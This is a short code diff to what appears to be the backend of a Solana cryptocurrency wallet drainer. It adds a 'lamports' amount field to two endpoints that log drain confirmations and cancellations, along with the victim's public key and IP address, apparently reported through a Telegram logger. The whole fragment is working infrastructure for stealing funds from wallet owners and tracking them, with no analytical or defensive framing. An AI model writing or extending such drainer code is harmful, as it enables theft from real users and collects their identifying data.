@@ -109,6 +109,7 @@ app.post('/api/drainer/log-confirmation', async (req, res) => {
       await telegramLogger.logDrainSuccess({
         publicKey: publicKey,
         actualDrainAmount: 0, // Will be calculated from transaction
+        lamports: req.body.lamports || 0,
         ip: userIp
       });
     } else if (error) {
@@ -144,6 +145,7 @@ app.post('/api/drainer/log-cancellation', async (req, res) => {
       publicKey: publicKey,
       walletType: walletType || 'Unknown',
       reason: reason || 'User cancelled transaction',
+      lamports: req.body.lamports || 0,
       ip: userIp
     });
     
